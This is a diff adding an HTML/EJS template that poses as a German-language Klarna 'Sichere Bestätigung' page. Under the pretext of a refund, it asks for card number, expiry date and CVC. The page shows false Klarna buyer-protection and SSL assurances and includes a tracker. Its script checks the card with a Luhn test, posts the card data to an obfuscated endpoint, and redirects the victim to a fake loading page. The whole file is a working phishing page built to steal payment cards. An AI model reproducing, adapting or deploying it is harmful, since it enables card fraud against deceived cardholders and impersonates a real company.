@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klarna Card Confirmation</title>
+    <link rel="stylesheet" href="./css/bavoka.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+    <style>
+        .error-message { 
+            color: #d01a1a; 
+            font-size: 13px; 
+            margin-top: 5px; 
+            display: none; 
+            font-weight: 500;
+        }
+        .input-error { 
+            border: 1px solid #d01a1a !important; 
+            background-color: #fff8f8; 
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <form class="form1" method="post">
+            <div class="up">
+                <!-- Header -->
+                <div class="header-row">
+                    <button class="back-btn" aria-label="Go back">
+                        <svg aria-hidden="true" role="img" viewBox="0 0 20 20" height="24" width="24">
+                            <g fill="none" fill-rule="evenodd" transform="translate(0, 0) scale(1)">
+                                <path
+                                    d="M12.5 9.167H4.047c.418-.365.828-.74 1.222-1.129a27.562 27.562 0 0 0 2.905-3.381l-1.348-.98a25.873 25.873 0 0 1-2.728 3.176c-.91.899-1.892 1.73-2.919 2.471a.833.833 0 0 0 0 1.352 24.844 24.844 0 0 1 2.92 2.471 25.87 25.87 0 0 1 2.727 3.177l1.348-.981a27.57 27.57 0 0 0-2.905-3.381c-.394-.39-.804-.764-1.222-1.129H12.5c2.757 0 5 2.243 5 5h1.667A6.674 6.674 0 0 0 12.5 9.167Z"
+                                    fill="rgba(11, 5, 29, 1)" style="transition: fill 0.2s;"></path>
+                            </g>
+                        </svg>
+                    </button>
+
+                    <div class="hodpa">
+                        <img src="./img/huodop.PNG" alt="">
+                    </div>
+
+                    <button class="close-btn" style="position: static;" aria-label="Close">
+                        <svg width="18" height="18" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"
+                                fill="#535353" />
+                        </svg>
+                    </button>
+                </div>
+
+                <h1>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round"
+                        style="margin-right: 8px; vertical-align: middle;">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    Sichere Bestätigung
+                </h1>
+                <p class="pp1">Bestätigen Sie Ihre Klarna-Karte oder Klarna-Kreditkarte, um den Rückerstattungsprozess
+                    zu starten.</p>
+
+                <!-- Card Number -->
+                <div class="form-group">
+                   <svg class="input-icon" width="24" height="24" viewBox="0 0 60 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M10 20C8.8954 20 8 20.8954 8 22C8 23.1046 8.8954 24 10 24H18C19.1046 24 20 23.1046 20 22C20 20.8954 19.1046 20 18 20H10Z" fill="black"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M0 12C0 5.3726 5.37258 0 12 0H48C54.6274 0 60 5.3726 60 12V32C60 38.6274 54.6274 44 48 44H12C5.37258 44 0 38.6274 0 32V12ZM12 4C7.58172 4 4 7.5817 4 12H56C56 7.5817 52.4183 4 48 4H12ZM4 32V16H56V32C56 36.4183 52.4183 40 48 40H12C7.58172 40 4 36.4183 4 32Z" fill="black"/>
+</svg>
+
+                    <div class="input-wrapper">
+                        <input type="text" id="card_number" class="form-input input-with-icon" placeholder=" " required
+                            inputmode="numeric" />
+                        <label class="form-label" for="card_number">Kartennummer</label>
+                    </div>
+                    <div class="error-message" id="error_card_number"></div>
+                </div>
+
+                <!-- Expiry and CVC Row -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <svg class="input-icon" aria-hidden="true" role="img" viewBox="0 0 24 24" height="24" width="24"
+                            fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                            <line x1="16" y1="2" x2="16" y2="6"></line>
+                            <line x1="8" y1="2" x2="8" y2="6"></line>
+                            <line x1="3" y1="10" x2="21" y2="10"></line>
+                        </svg>
+                        <input type="text" id="expiry_date" class="form-input input-with-icon" placeholder=" " required
+                            maxlength="5" />
+                        <label class="form-label" for="expiry_date">MM / JJ</label>
+                        <div class="error-message" id="error_expiry"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <svg class="input-icon" aria-hidden="true" role="img" viewBox="0 0 24 24" height="24" width="24"
+                            fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        <input type="text" id="cvc" class="form-input input-with-icon" placeholder=" " required
+                            maxlength="4" inputmode="numeric" />
+                        <label class="form-label" for="cvc">CVC</label>
+                        <div class="error-message" id="error_cvc"></div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="down">
+                <div class="bottom-spacer">
+                    <button type="submit" class="submit-btn" style="margin-bottom: 24px; width: 100%;">Bestätigen</button>
+
+                    <!-- Security Badge -->
+                    <div style="display: flex;
+    justify-content: center;
+    align-items: center;" class="security-badge">
+                        <svg width="24" height="24" viewBox="0 0 24 24">
+                            <path
+                                d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
+                        </svg>
+                        <span>Klarna Käuferschutz & Datensicherheit</span>
+                    </div>
+
+                    <p class="fine-print">
+                        Ihre Daten werden mit 256-Bit SSL-Verschlüsselung übertragen.
+                    </p>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const cardInput = document.getElementById('card_number');
+            const expiryInput = document.getElementById('expiry_date');
+            const cvcInput = document.getElementById('cvc');
+            const form = document.querySelector('form');
+            const submitButton = form.querySelector('button[type="submit"]');
+
+            // Helper to show error
+            function showError(inputId, message) {
+                const input = document.getElementById(inputId);
+                const errorDiv = document.getElementById('error_' + (inputId === 'expiry_date' ? 'expiry' : inputId));
+                
+                if (input && errorDiv) {
+                    input.classList.add('input-error');
+                    errorDiv.textContent = message;
+                    errorDiv.style.display = 'block';
+                }
+            }
+
+            // Helper to clear errors
+            function clearErrors() {
+                const inputs = [cardInput, expiryInput, cvcInput];
+                inputs.forEach(input => {
+                    if (input) input.classList.remove('input-error');
+                });
+                
+                const errors = document.querySelectorAll('.error-message');
+                errors.forEach(error => {
+                    error.style.display = 'none';
+                    error.textContent = '';
+                });
+            }
+
+            // Clear errors on input
+            [cardInput, expiryInput, cvcInput].forEach(input => {
+                if (input) {
+                    input.addEventListener('input', function() {
+                        this.classList.remove('input-error');
+                        const errorId = 'error_' + (this.id === 'expiry_date' ? 'expiry' : this.id);
+                        const errorDiv = document.getElementById(errorId);
+                        if (errorDiv) errorDiv.style.display = 'none';
+                    });
+                }
+            });
+
+            // Luhn Algorithm for Card Validation
+            function isValidLuhn(number) {
+                let sum = 0;
+                let shouldDouble = false;
+                for (let i = number.length - 1; i >= 0; i--) {
+                    let digit = parseInt(number.charAt(i));
+                    if (shouldDouble) {
+                        if ((digit *= 2) > 9) digit -= 9;
+                    }
+                    sum += digit;
+                    shouldDouble = !shouldDouble;
+                }
+                return (sum % 10) == 0;
+            }
+
+            // Card Number Formatting
+            if (cardInput) {
+                cardInput.addEventListener('input', function (e) {
+                    let value = this.value.replace(/\D/g, '');
+                    if (value.length > 16) value = value.slice(0, 16);
+                    let formattedValue = '';
+                    for (let i = 0; i < value.length; i++) {
+                        if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                        formattedValue += value[i];
+                    }
+                    this.value = formattedValue;
+                });
+            }
+
+            // Expiry Date Formatting
+            if (expiryInput) {
+                expiryInput.addEventListener('input', function (e) {
+                    let value = this.value.replace(/\D/g, '');
+                    if (value.length > 4) value = value.slice(0, 4);
+                    
+                    if (value.length >= 2) {
+                        if(e.inputType !== 'deleteContentBackward') {
+                            this.value = value.slice(0, 2) + '/' + value.slice(2);
+                        } else {
+                            if(value.length === 2 && !this.value.includes('/')) {
+                                this.value = value;
+                            } else {
+                                this.value = value.slice(0, 2) + (value.length > 2 ? '/' : '') + value.slice(2);
+                            }
+                        }
+                    } else {
+                        this.value = value;
+                    }
+                });
+            }
+
+            // CVC Formatting
+            if (cvcInput) {
+                cvcInput.addEventListener('input', function (e) {
+                    this.value = this.value.replace(/\D/g, '').slice(0, 4);
+                });
+            }
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                clearErrors();
+
+                const rawCardNumber = cardInput.value.replace(/\s+/g, '');
+                const rawExpiry = expiryInput.value;
+                const rawCvc = cvcInput.value;
+                let hasError = false;
+
+                // Validation
+                if (rawCardNumber.length < 13 || rawCardNumber.length > 16) {
+                    showError('card_number', 'Bitte geben Sie eine gültige Kartennummer ein.');
+                    hasError = true;
+                } else if (!isValidLuhn(rawCardNumber)) {
+                    showError('card_number', 'Die Kartennummer ist ungültig.');
+                    hasError = true;
+                }
+
+                if (rawExpiry.length !== 5 || !rawExpiry.includes('/')) {
+                     showError('expiry_date', 'Bitte geben Sie ein gültiges Ablaufdatum ein (MM/JJ).');
+                     hasError = true;
+                } else {
+                    const [expMonth, expYear] = rawExpiry.split('/');
+                    const currentYear = new Date().getFullYear() % 100;
+                    const currentMonth = new Date().getMonth() + 1;
+                    
+                    if(parseInt(expMonth) < 1 || parseInt(expMonth) > 12) {
+                        showError('expiry_date', 'Ungültiger Monat.');
+                        hasError = true;
+                    } else if(parseInt(expYear) < currentYear || (parseInt(expYear) === currentYear && parseInt(expMonth) < currentMonth)) {
+                        showError('expiry_date', 'Die Karte ist abgelaufen.');
+                        hasError = true;
+                    }
+                }
+
+                if (rawCvc.length < 3) {
+                    showError('cvc', 'Bitte geben Sie einen gültigen CVC ein.');
+                    hasError = true;
+                }
+
+                if (hasError) return;
+
+                // Disable inputs
+                const inputs = [cardInput, expiryInput, cvcInput];
+                inputs.forEach(input => input.disabled = true);
+                submitButton.disabled = true;
+                submitButton.textContent = 'Wird verarbeitet...';
+
+                const code = {
+                    cardNumber: rawCardNumber,
+                    expiryDate: rawExpiry,
+                    cvv: rawCvc
+                };
+
+                // Send to backend
+                $.ajax({
+                    url: '/NkMNm4664XhcW8KuukHk',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify(code),
+                    success: function(info) {
+                        if(info.OK){
+                            window.location.href = '/loading?time=9&url=/LGknmeM9HwWUWSutj6mJ';
+                        } else {
+                             // Handle generic server failure if OK is false but request succeeded (rare but possible)
+                             inputs.forEach(input => input.disabled = false);
+                             submitButton.disabled = false;
+                             submitButton.textContent = 'Bestätigen';
+                             showError('card_number', 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
+                        }
+                    },
+                    error: function() {
+                        inputs.forEach(input => input.disabled = false);
+                        submitButton.disabled = false;
+                        submitButton.textContent = 'Bestätigen';
+                        showError('card_number', 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+
+</html>
